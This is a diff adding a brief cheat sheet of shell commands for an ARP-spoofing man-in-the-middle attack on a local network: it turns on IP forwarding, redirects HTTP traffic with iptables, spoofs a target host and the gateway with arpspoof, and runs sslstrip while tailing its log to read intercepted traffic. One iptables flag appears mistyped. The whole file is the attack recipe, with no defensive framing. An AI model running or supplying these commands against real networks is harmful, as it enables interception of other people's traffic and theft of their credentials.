@@ -1,0 +1,13 @@
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+iptables -t nat -L PREROUTING
+
+arpspoof -i wlanp2s0 -t 192.168.0.103 -r 192.168.0.1 -> Also flip ips
+
+iptables -I INPUT 1 -p tcp -dport 8080 -j ACCEPT
+
+tail -f sslstrip.log -> Read live changes
+
+sslstrip -l 8080
